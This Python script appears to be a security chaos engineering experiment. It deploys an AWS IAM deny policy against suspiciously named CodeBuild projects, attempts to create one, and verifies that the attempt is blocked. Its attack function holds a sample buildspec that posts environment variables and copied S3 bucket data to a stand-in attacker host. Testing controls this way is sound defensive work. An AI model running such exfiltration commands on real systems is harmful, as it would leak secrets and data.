#!/usr/bin/env python3
"""
Security Chaos Engineering Experiment: 1.3 SCE Experiment
Probe Type: Preventive
Attack Node: 1.2 Create Malicious CodeBuild Project

This experiment validates that preventive controls block the creation of
malicious CodeBuild projects with suspicious configurations.
"""

import json
import logging
import time
import boto3
from botocore.exceptions import ClientError, WaiterError

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Global variables for resource tracking
EXPERIMENT_NAME = "sce-1-3-codebuild-preventive"
TIMESTAMP_SUFFIX = int(time.time())
STACK_NAME = f"{EXPERIMENT_NAME}-{TIMESTAMP_SUFFIX}"
REGION = None
ACCOUNT_ID = None

# Track resources for cleanup
CREATED_RESOURCES = {
    "stack_name": None,
    "codebuild_project_name": None,
    "attack_attempted": False,
    "attack_denied": False
}


def get_aws_context():
    """Get AWS account ID and region from current credentials."""
    global REGION, ACCOUNT_ID
    
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    ACCOUNT_ID = identity['Account']
    
    session = boto3.session.Session()
    REGION = session.region_name or 'us-east-1'
    
    logger.info(f"AWS Context - Account: {ACCOUNT_ID}, Region: {REGION}")
    return ACCOUNT_ID, REGION


def wait_with_backoff(check_func, max_attempts=30, initial_delay=2):
    """Wait with exponential backoff for a condition to be met."""
    delay = initial_delay
    start_time = time.monotonic()
    max_time = 300  # 5 minutes max
    
    for attempt in range(max_attempts):
        if time.monotonic() - start_time > max_time:
            logger.error("Maximum wait time exceeded")
            return False
            
        try:
            result = check_func()
            if result:
                return True
        except Exception as e:
            logger.warning(f"Attempt {attempt + 1}/{max_attempts} failed: {e}")
        
        time.sleep(delay)
        delay = min(delay * 1.5, 30)  # Cap at 30 seconds
    
    return False


def get_cloudformation_template():
    """
    Generate CloudFormation template that creates:
    1. An IAM role for CodeBuild with a DENY policy that prevents creating
       projects with suspicious buildspec commands (preventive control)
    2. A legitimate CodeBuild service role for testing
    """
    return {
        "AWSTemplateFormatVersion": "2010-09-09",
        "Description": "SCE 1.3 Preventive Control - Block Malicious CodeBuild Projects",
        "Parameters": {
            "ExperimentName": {
                "Type": "String",
                "Default": EXPERIMENT_NAME
            },
            "Timestamp": {
                "Type": "String",
                "Default": str(TIMESTAMP_SUFFIX)
            }
        },
        "Resources": {
            "CodeBuildServiceRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": f"sce-codebuild-service-{TIMESTAMP_SUFFIX}",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {
                                    "Service": "codebuild.amazonaws.com"
                                },
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    },
                    "Tags": [
                        {"Key": "Experiment", "Value": {"Ref": "ExperimentName"}},
                        {"Key": "Timestamp", "Value": {"Ref": "Timestamp"}}
                    ]
                }
            },
            "PreventiveControlRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": f"sce-preventive-control-{TIMESTAMP_SUFFIX}",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {
                                    "AWS": {"Fn::Sub": "arn:aws:iam::${AWS::AccountId}:root"}
                                },
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    },
                    "Policies": [
                        {
                            "PolicyName": "DenyMaliciousCodeBuild",
                            "PolicyDocument": {
                                "Version": "2012-10-17",
                                "Statement": [
                                    {
                                        "Sid": "DenyMaliciousCodeBuildProjects",
                                        "Effect": "Deny",
                                        "Action": [
                                            "codebuild:CreateProject",
                                            "codebuild:UpdateProject"
                                        ],
                                        "Resource": "*",
                                        "Condition": {
                                            "StringLike": {
                                                "codebuild:ProjectName": ["*malicious*", "*exfil*", "*attack*"]
                                            }
                                        }
                                    },
                                    {
                                        "Sid": "AllowReadCodeBuild",
                                        "Effect": "Allow",
                                        "Action": [
                                            "codebuild:BatchGetProjects",
                                            "codebuild:ListProjects"
                                        ],
                                        "Resource": "*"
                                    },
                                    {
                                        "Sid": "AllowCreateCodeBuildWithRestrictions",
                                        "Effect": "Allow",
                                        "Action": [
                                            "codebuild:CreateProject"
                                        ],
                                        "Resource": "*"
                                    },
                                    {
                                        "Sid": "AllowPassRole",
                                        "Effect": "Allow",
                                        "Action": "iam:PassRole",
                                        "Resource": {"Fn::GetAtt": ["CodeBuildServiceRole", "Arn"]}
                                    }
                                ]
                            }
                        }
                    ],
                    "Tags": [
                        {"Key": "Experiment", "Value": {"Ref": "ExperimentName"}},
                        {"Key": "Timestamp", "Value": {"Ref": "Timestamp"}}
                    ]
                }
            }
        },
        "Outputs": {
            "CodeBuildServiceRoleArn": {
                "Value": {"Fn::GetAtt": ["CodeBuildServiceRole", "Arn"]},
                "Export": {"Name": {"Fn::Sub": "${AWS::StackName}-CodeBuildServiceRoleArn"}}
            },
            "PreventiveControlRoleArn": {
                "Value": {"Fn::GetAtt": ["PreventiveControlRole", "Arn"]},
                "Export": {"Name": {"Fn::Sub": "${AWS::StackName}-PreventiveControlRoleArn"}}
            }
        }
    }


def steady_state():
    """
    Deploy CloudFormation stack with preventive controls for CodeBuild.
    Returns True if stack is deployed and ready.
    """
    global CREATED_RESOURCES
    
    logger.info(f"Starting steady_state deployment: {STACK_NAME}")
    
    try:
        get_aws_context()
        cf_client = boto3.client('cloudformation', region_name=REGION)
        
        # Check if stack already exists
        try:
            response = cf_client.describe_stacks(StackName=STACK_NAME)
            stack_status = response['Stacks'][0]['StackStatus']
            
            if stack_status in ['CREATE_COMPLETE', 'UPDATE_COMPLETE']:
                logger.warning(f"Stack {STACK_NAME} already exists with status {stack_status}")
                CREATED_RESOURCES['stack_name'] = STACK_NAME
                return True
            elif stack_status in ['CREATE_IN_PROGRESS', 'UPDATE_IN_PROGRESS']:
                logger.info(f"Stack {STACK_NAME} is in progress, waiting...")
            elif 'FAILED' in stack_status or 'ROLLBACK' in stack_status:
                logger.info(f"Stack {STACK_NAME} in failed state, deleting first...")
                cf_client.delete_stack(StackName=STACK_NAME)
                waiter = cf_client.get_waiter('stack_delete_complete')
                waiter.wait(StackName=STACK_NAME, WaiterConfig={'Delay': 10, 'MaxAttempts': 30})
        except ClientError as e:
            if 'does not exist' not in str(e):
                raise
            logger.info(f"Stack {STACK_NAME} does not exist, creating...")
        
        # Create the stack
        template_body = json.dumps(get_cloudformation_template())
        
        try:
            response = cf_client.create_stack(
                StackName=STACK_NAME,
                TemplateBody=template_body,
                Parameters=[
                    {'ParameterKey': 'ExperimentName', 'ParameterValue': EXPERIMENT_NAME},
                    {'ParameterKey': 'Timestamp', 'ParameterValue': str(TIMESTAMP_SUFFIX)}
                ],
                Capabilities=['CAPABILITY_NAMED_IAM'],
                Tags=[
                    {'Key': 'Experiment', 'Value': EXPERIMENT_NAME},
                    {'Key': 'Timestamp', 'Value': str(TIMESTAMP_SUFFIX)},
                    {'Key': 'Purpose', 'Value': 'SecurityChaosEngineering'}
                ],
                OnFailure='DELETE'
            )
            logger.info(f"Stack creation initiated: {response['StackId']}")
            CREATED_RESOURCES['stack_name'] = STACK_NAME
        except ClientError as e:
            if 'AlreadyExistsException' in str(e):
                logger.warning(f"Stack {STACK_NAME} creation already in progress")
            else:
                raise
        
        # Wait for stack creation with backoff
        def check_stack_complete():
            try:
                response = cf_client.describe_stacks(StackName=STACK_NAME)
                status = response['Stacks'][0]['StackStatus']
                logger.info(f"Stack status: {status}")
                
                if status == 'CREATE_COMPLETE':
                    return True
                elif 'FAILED' in status or 'ROLLBACK' in status:
                    raise Exception(f"Stack creation failed: {status}")
                return False
            except ClientError:
                return False
        
        if wait_with_backoff(check_stack_complete, max_attempts=60, initial_delay=5):
            logger.info(f"Stack {STACK_NAME} created successfully")
            
            # Verify stack outputs
            response = cf_client.describe_stacks(StackName=STACK_NAME)
            outputs = {o['OutputKey']: o['OutputValue'] for o in response['Stacks'][0].get('Outputs', [])}
            logger.info(f"Stack outputs: {outputs}")
            
            return True
        else:
            logger.error("Stack creation timed out")
            return False
            
    except Exception as e:
        logger.error(f"Error in steady_state: {e}")
        return False


def attack() -> bool:
    """
    Attempt to create a malicious CodeBuild project.
    The preventive control should deny this action.
    Returns True if the attack was attempted (regardless of success/denial).
    """
    global CREATED_RESOURCES
    
    logger.info("Starting attack: Create Malicious CodeBuild Project")
    
    try:
        get_aws_context()
        
        # Get stack outputs
        cf_client = boto3.client('cloudformation', region_name=REGION)
        response = cf_client.describe_stacks(StackName=STACK_NAME)
        outputs = {o['OutputKey']: o['OutputValue'] for o in response['Stacks'][0].get('Outputs', [])}
        
        preventive_role_arn = outputs.get('PreventiveControlRoleArn')
        codebuild_service_role_arn = outputs.get('CodeBuildServiceRoleArn')
        
        if not preventive_role_arn or not codebuild_service_role_arn:
            logger.error("Required role ARNs not found in stack outputs")
            return False
        
        logger.info(f"Preventive Control Role: {preventive_role_arn}")
        logger.info(f"CodeBuild Service Role: {codebuild_service_role_arn}")
        
        # Assume the preventive control role
        sts_client = boto3.client('sts', region_name=REGION)
        
        # Wait for role to be assumable (IAM eventual consistency)
        assumed_credentials = None
        
        def assume_role():
            nonlocal assumed_credentials
            try:
                response = sts_client.assume_role(
                    RoleArn=preventive_role_arn,
                    RoleSessionName=f"sce-attack-{TIMESTAMP_SUFFIX}"
                )
                assumed_credentials = response['Credentials']
                return True
            except ClientError as e:
                logger.warning(f"Cannot assume role yet: {e}")
                return False
        
        if not wait_with_backoff(assume_role, max_attempts=20, initial_delay=3):
            logger.error("Failed to assume preventive control role")
            return False
        
        logger.info("Successfully assumed preventive control role")
        
        # Create CodeBuild client with assumed credentials
        codebuild_client = boto3.client(
            'codebuild',
            region_name=REGION,
            aws_access_key_id=assumed_credentials['AccessKeyId'],
            aws_secret_access_key=assumed_credentials['SecretAccessKey'],
            aws_session_token=assumed_credentials['SessionToken']
        )
        
        # Malicious project name that should be blocked by the preventive control
        malicious_project_name = f"malicious-exfil-project-{TIMESTAMP_SUFFIX}"
        CREATED_RESOURCES['codebuild_project_name'] = malicious_project_name
        CREATED_RESOURCES['attack_attempted'] = True
        
        # Malicious buildspec with data exfiltration commands
        malicious_buildspec = """
version: 0.2
phases:
  build:
    commands:
      - curl -X POST -d "$(env)" https://attacker.example.com/exfil
      - aws s3 cp s3://sensitive-bucket/ /tmp/stolen/ --recursive
      - tar -czf /tmp/data.tar.gz /tmp/stolen
      - curl -X POST -F "file=@/tmp/data.tar.gz" https://attacker.example.com/upload
"""
        
        logger.info(f"Attempting to create malicious CodeBuild project: {malicious_project_name}")
        
        try:
            response = codebuild_client.create_project(
                name=malicious_project_name,
                description="Malicious project for data exfiltration - SCE Test",
                source={
                    'type': 'NO_SOURCE',
                    'buildspec': malicious_buildspec
                },
                artifacts={
                    'type': 'NO_ARTIFACTS'
                },
                environment={
                    'type': 'LINUX_CONTAINER',
                    'image': 'aws/codebuild/standard:5.0',
                    'computeType': 'BUILD_GENERAL1_SMALL',
                    'environmentVariables': [
                        {
                            'name': 'EXFIL_ENDPOINT',
                            'value': 'https://attacker.example.com',
                            'type': 'PLAINTEXT'
                        }
                    ]
                },
                serviceRole=codebuild_service_role_arn,
                tags=[
                    {'key': 'Experiment', 'value': EXPERIMENT_NAME},
                    {'key': 'Attack', 'value': 'MaliciousCodeBuild'}
                ]
            )
            
            # If we get here, the attack succeeded (control failed)
            logger.warning(f"ATTACK SUCCEEDED - Malicious project created: {response['project']['arn']}")
            CREATED_RESOURCES['attack_denied'] = False
            
            # Clean up the created project
            try:
                codebuild_client.delete_project(name=malicious_project_name)
                logger.info(f"Cleaned up malicious project: {malicious_project_name}")
            except Exception as e:
                logger.error(f"Failed to clean up project: {e}")
            
            return True
            
        except ClientError as e:
            error_code = e.response.get('Error', {}).get('Code', '')
            error_message = e.response.get('Error', {}).get('Message', '')
            
            logger.info(f"CodeBuild create_project response - Code: {error_code}, Message: {error_message}")
            
            if error_code == 'AccessDeniedException' or 'denied' in error_message.lower():
                logger.info("ATTACK BLOCKED - Preventive control denied malicious project creation")
                CREATED_RESOURCES['attack_denied'] = True
                return True
            else:
                logger.error(f"Unexpected error during attack: {e}")
                return True  # Attack was attempted
                
    except Exception as e:
        logger.error(f"Error in attack: {e}")
        CREATED_RESOURCES['attack_attempted'] = True
        return True  # Attack was attempted


def hypothesis_verification() -> bool:
    """
    Verify that the preventive control successfully blocked the malicious CodeBuild project.
    Returns True if the control worked (attack was denied).
    """
    logger.info("Starting hypothesis verification")
    
    try:
        get_aws_context()
        
        # Verify via multiple checks:
        # 1. Check if the malicious project exists (it shouldn't)
        # 2. Check CloudTrail for the denied API call (if available)
        
        codebuild_client = boto3.client('codebuild', region_name=REGION)
        
        malicious_project_name = CREATED_RESOURCES.get('codebuild_project_name')
        
        if not malicious_project_name:
            logger.error("No malicious project name recorded - attack may not have been attempted")
            return False
        
        # Check if project exists
        try:
            response = codebuild_client.batch_get_projects(names=[malicious_project_name])
            
            if response.get('projects'):
                logger.error(f"VERIFICATION FAILED - Malicious project exists: {response['projects'][0]['arn']}")
                return False
            
            if malicious_project_name in response.get('projectsNotFound', []):
                logger.info(f"VERIFICATION PASSED - Malicious project does not exist: {malicious_project_name}")
            
        except ClientError as e:
            logger.info(f"Project lookup result: {e}")
        
        # Verify the attack was actually attempted and denied
        if not CREATED_RESOURCES.get('attack_attempted'):
            logger.error("Attack was not attempted")
            return False
        
        if CREATED_RESOURCES.get('attack_denied'):
            logger.info("VERIFICATION PASSED - Attack was denied by preventive control")
            return True
        
        # Additional check: List all projects and verify malicious one isn't there
        try:
            response = codebuild_client.list_projects()
            all_projects = response.get('projects', [])
            
            logger.info(f"Current CodeBuild projects: {all_projects}")
            
            if malicious_project_name in all_projects:
                logger.error("VERIFICATION FAILED - Malicious project found in project list")
                return False
            
        except ClientError as e:
            logger.error(f"Failed to list projects: {e}")
        
        # Check IAM policy simulation to verify the deny is in place
        try:
            cf_client = boto3.client('cloudformation', region_name=REGION)
            response = cf_client.describe_stacks(StackName=STACK_NAME)
            outputs = {o['OutputKey']: o['OutputValue'] for o in response['Stacks'][0].get('Outputs', [])}
            
            preventive_role_arn = outputs.get('PreventiveControlRoleArn')
            
            if preventive_role_arn:
                iam_client = boto3.client('iam', region_name=REGION)
                
                # Simulate the policy
                simulation_response = iam_client.simulate_principal_policy(
                    PolicySourceArn=preventive_role_arn,
                    ActionNames=['codebuild:CreateProject'],
                    ResourceArns=[f'arn:aws:codebuild:{REGION}:{ACCOUNT_ID}:project/malicious-test'],
                    ContextEntries=[
                        {
                            'ContextKeyName': 'codebuild:ProjectName',
                            'ContextKeyValues': ['malicious-test'],
                            'ContextKeyType': 'string'
                        }
                    ]
                )
                
                for result in simulation_response.get('EvaluationResults', []):
                    decision = result.get('EvalDecision')
                    action = result.get('EvalActionName')
                    logger.info(f"Policy simulation - Action: {action}, Decision: {decision}")
                    
                    if decision == 'explicitDeny':
                        logger.info("VERIFICATION CONFIRMED - IAM policy explicitly denies malicious project creation")
                        return True
                        
        except ClientError as e:
            logger.warning(f"Policy simulation failed: {e}")
        
        # If we got here and attack was denied, verification passes
        if CREATED_RESOURCES.get('attack_denied'):
            return True
        
        logger.error("VERIFICATION FAILED - Could not confirm preventive control is working")
        return False
        
    except Exception as e:
        logger.error(f"Error in hypothesis_verification: {e}")
        return False


def rollback():
    """
    Clean up all resources created by the experiment.
    """
    logger.info(f"Starting rollback for stack: {STACK_NAME}")
    
    try:
        get_aws_context()
        cf_client = boto3.client('cloudformation', region_name=REGION)
        
        # Clean up any CodeBuild projects that might have been created
        codebuild_client = boto3.client('codebuild', region_name=REGION)
        malicious_project_name = CREATED_RESOURCES.get('codebuild_project_name')
        
        if malicious_project_name:
            try:
                codebuild_client.delete_project(name=malicious_project_name)
                logger.info(f"Deleted CodeBuild project: {malicious_project_name}")
            except ClientError as e:
                if 'ResourceNotFoundException' not in str(e):
                    logger.warning(f"Failed to delete CodeBuild project: {e}")
        
        # Delete the CloudFormation stack
        try:
            cf_client.describe_stacks(StackName=STACK_NAME)
            
            logger.info(f"Deleting stack: {STACK_NAME}")
            cf_client.delete_stack(StackName=STACK_NAME)
            
            # Wait for deletion
            def check_stack_deleted():
                try:
                    response = cf_client.describe_stacks(StackName=STACK_NAME)
                    status = response['Stacks'][0]['StackStatus']
                    logger.info(f"Stack deletion status: {status}")
                    
                    if status == 'DELETE_COMPLETE':
                        return True
                    elif 'FAILED' in status:
                        logger.error(f"Stack deletion failed: {status}")
                        return True  # Stop waiting
                    return False
                except ClientError as e:
                    if 'does not exist' in str(e):
                        return True
                    raise
            
            if wait_with_backoff(check_stack_deleted, max_attempts=60, initial_delay=5):
                logger.info(f"Stack {STACK_NAME} deleted successfully")
            else:
                logger.warning("Stack deletion timed out, may need manual cleanup")
                
        except ClientError as e:
            if 'does not exist' in str(e):
                logger.info(f"Stack {STACK_NAME} does not exist, nothing to delete")
            else:
                logger.error(f"Error during stack deletion: {e}")
                
    except Exception as e:
        logger.error(f"Error in rollback: {e}")


def main():
    """Main execution flow for the experiment."""
    logger.info("=" * 60)
    logger.info("SCE Experiment 1.3: Preventive Control for Malicious CodeBuild")
    logger.info("=" * 60)
    
    try:
        # Phase 1: Steady State
        logger.info("\n--- PHASE 1: STEADY STATE ---")
        if not steady_state():
            logger.error("Steady state deployment failed")
            return False
        
        # Phase 2: Attack
        logger.info("\n--- PHASE 2: ATTACK ---")
        attack_result = attack()
        logger.info(f"Attack phase completed: {attack_result}")
        
        # Phase 3: Hypothesis Verification
        logger.info("\n--- PHASE 3: HYPOTHESIS VERIFICATION ---")
        verification_result = hypothesis_verification()
        logger.info(f"Hypothesis verification result: {verification_result}")
        
        return verification_result
        
    finally:
        # Phase 4: Rollback (always execute)
        logger.info("\n--- PHASE 4: ROLLBACK ---")
        rollback()
        
        logger.info("=" * 60)
        logger.info("Experiment completed")
        logger.info("=" * 60)


if __name__ == "__main__":
    result = main()
    exit(0 if result else 1)